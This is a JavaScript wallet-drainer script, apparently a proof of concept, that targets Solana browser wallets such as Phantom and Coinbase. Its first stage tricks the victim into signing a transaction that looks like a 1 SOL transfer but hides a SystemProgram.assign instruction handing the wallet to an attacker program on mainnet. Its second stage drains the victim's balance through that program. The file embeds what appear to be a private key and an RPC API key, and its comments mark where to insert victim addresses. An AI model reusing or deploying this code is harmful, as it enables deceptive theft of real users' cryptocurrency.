const web3 = require("@solana/web3.js");
const { struct, u32, ns64 } = require("@solana/buffer-layout");
const { Buffer } = require("buffer");



// Provider and wallet connection
let solana;
let connection;

// Accounts
let accounts = [];


function importAccountFromBase58(base58PrivateKey) {
  const bs58 = require("bs58");
  // Decode the base58 encoded private key into a Uint8Array
  const decodedPrivateKey = bs58.decode(base58PrivateKey);

  // Create a Solana keypair from the secret key (decoded private key)
  const keypair = web3.Keypair.fromSecretKey(decodedPrivateKey);

  return keypair;
}

async function CHECK_INITIALIZED() {
  if (connection == null) {
    await testInit();
  }
}

const getProvider = () => {
  if ('phantom' in window) {
    return window.phantom;
  }

  if ('coinbaseSolana' in window) {
    return window.coinbaseSolana;
  }

  return window.solana;
};

export async function testInit() {
  // Solana provider
  solana = getProvider();//

  console.log("Connecting...")
  try {
    let account = await solana.connect();

    if ('coinbaseSolana' in window) {
      // Coinbase's account is the actual provider
      account = solana;
      accounts[0] = solana.publicKey;
    } else {
      if (account == null) {
        throw new Error('No account received upon connect.');
      }

      accounts[0] = account.publicKey;
    }
    console.log(`Successfully connected to account: ${account.publicKey}`);

    if (connection == null) {
      const mainnetUrl = 'https://solana-mainnet.g.alchemy.com/v2/ocQRq4Baun8ejr0djCdUlubnTiwqFJtF';

      connection = new web3.Connection(mainnetUrl, 'confirmed');
    } else {
      console.log("Already connected.");
    }

    let slot = await connection.getSlot();

    console.log("Successfully connected - slot: ", slot);

    let blockTime = await connection.getBlockTime(slot);
    console.log("Block time: ", blockTime);
  } catch (error) {
    console.error(error);
  }
}

// Stage #1 
export async function transferFundsAndTakeOver() {
  await CHECK_INITIALIZED();

  const transaction = new web3.Transaction();

  let blockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

  transaction.recentBlockhash = blockhash;
  transaction.feePayer = accounts[0];

  // Attacker's contract take over ID
  // [NO CHANGE] The smart contract is deployed to mainnet-beta
  let takeOverId = new web3.PublicKey("A3mayAzsbd4H1YFnLBbafAMxbygXYx56Dq2jKupWczM9");

  // AirDrop 'Promotion' account holding the origin of the funds
  // This is actually the attacker's keyring (same holding "attackerPubkey"). We add the keyring here to facilitate
  // usability, since wallet account will be pointing to the victim in this part of the flow.
  //  -----
  // [CHAGE]: Add your 'attacker' base58 encoded private key
  let promotAccount = importAccountFromBase58("2cYkjaMuDuJtxTTBXpgntuDCneEqcMqjhSEqM7T54b7qF81FtcULFJF6mdkJcwsXfpKVsmMqJ7cqgfpDZQ2yJyUp");

  transaction.feePayer = promotAccount.publicKey;

  // This lures the victm into believing she is only transferring the amount for the purchase
  transaction.add(
    web3.SystemProgram.transfer({
      fromPubkey: promotAccount.publicKey,
      toPubkey: accounts[0], // Wallet
      lamports: web3.LAMPORTS_PER_SOL,
    }),
  );

  let instruction = web3.SystemProgram.assign({
    accountPubkey: accounts[0], // Wallet
    programId: takeOverId
  });
  transaction.add(instruction);
  transaction.sign(promotAccount);

  try {
    const signedTransaction = await solana.signTransaction(transaction);
    const serialized = signedTransaction.serialize();
    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
    await connection.confirmTransaction(txid);

    transferFundsAndTakeOverResult.innerHTML = txid;
    console.log('signature: ' + signedTransaction.signature.toString('hex'));
  } catch (err) {
    transferFundsAndTakeOverResult.innerHTML = `Error: ${err.message}`;
  }
}

// Stage #2
export async function drainWallet() {
  await CHECK_INITIALIZED();

  const transaction = new web3.Transaction();

  let blockhash = (await connection.getLatestBlockhash('finalized')).blockhash;

  transaction.recentBlockhash = blockhash;
  transaction.feePayer = accounts[0];

  // Account 5 - victim
  // [CHANGE] Set your victim's account
  let victimPubkey = new web3.PublicKey("BcrJgWAKXVPVkwdphPPHmXsNFTApcqhirAbJjxSZzizM");

  // Attacker's contract take over ID
  // [NO CHANGE] The smart contract is deployed to mainnet-beta, it receives two accounts:
  // source and destination
  // debts from source (victim), credits to destination (attacker)
  let takeOverId = new web3.PublicKey("A3mayAzsbd4H1YFnLBbafAMxbygXYx56Dq2jKupWczM9");

  transaction.add(
    new web3.TransactionInstruction({
      keys: [
        { pubkey: victimPubkey, isSigner: false, isWritable: true },
        { pubkey: accounts[0], isSigner: true, isWritable: true }
      ],
      programId: takeOverId,
    }),
  );

  try {
    const signedTransaction = await solana.signTransaction(transaction);
    const serialized = signedTransaction.serialize();
    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
    await connection.confirmTransaction(txid);

    drainWalletResult.innerHTML = txid;
    console.log('signature: ' + signedTransaction.signature.toString('hex'));
  } catch (err) {
    drainWalletResult.innerHTML = `Error: ${err.message}`;
  }
}
